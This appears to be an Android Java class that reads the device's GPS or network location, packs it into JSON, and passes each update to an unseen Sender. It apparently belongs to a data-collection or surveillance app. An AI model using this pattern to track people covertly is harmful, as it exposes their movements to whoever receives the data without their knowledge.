package com.behavioralanalysis.service;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;

import org.json.JSONException;
import org.json.JSONObject;

public class Locations implements LocationListener {
    private final Context context;
    private boolean isGPSEnabled = false;
    private boolean isNetworkEnabled = false;
    private boolean canGetLocation = false;
    private android.location.Location location;
    private double latitude;
    private  double longitude;
    private float accuracy;
    private double altitude;
    private float speed;

    private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 10;

    private static final long MIN_TIME_BW_UPDATES = 1000 * 60 * 1;

    protected LocationManager locationManager;

    public Locations() {
        context = null;
    }

    public Locations(Context context) {
        this.context = context;
        get();
    }

    public android.location.Location get() {
        try {
            locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            isGPSEnabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            isNetworkEnabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);

            if (locationManager != null && (isGPSEnabled || isNetworkEnabled)) {
                canGetLocation = true;
                if (context.getPackageManager().checkPermission(Manifest.permission.ACCESS_FINE_LOCATION, context.getPackageName()) == PackageManager.PERMISSION_GRANTED &&
                context.getPackageManager().checkPermission(Manifest.permission.ACCESS_COARSE_LOCATION, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) {

                    if (isGPSEnabled) {
                        location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                    } else if (isNetworkEnabled) {
                        location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                    }

                    if (location != null) {
                        latitude = location.getLatitude();
                        longitude = location.getLongitude();
                        altitude = location.getAltitude();
                        accuracy = location.getAccuracy();
                        speed = location.getSpeed();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        return location;
    }

    public boolean isCanGetLocation() {
        return canGetLocation;
    }

    public JSONObject getData() {
        JSONObject result = null;

        if (location != null) {
            try {
                result = new JSONObject();
                result.put("enabled", true);
                result.put("latitude", latitude);
                result.put("longitude", longitude);
                result.put("altitude", altitude);
                result.put("accuracy", accuracy);
                result.put("speed", speed);
            } catch (JSONException e) {

            }
        }

        return result;
    }

    @Override
    public void onLocationChanged(android.location.Location location) {
        if (location != null) {
            latitude = location.getLatitude();
            longitude = location.getLongitude();
            altitude = location.getAltitude();
            accuracy = location.getAccuracy();
            speed = location.getSpeed();
        }

        Sender.send(getData());
    }

    @Override
    public void onProviderDisabled(String provider) {
    }

    @Override
    public void onProviderEnabled(String provider) {
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
    }
}
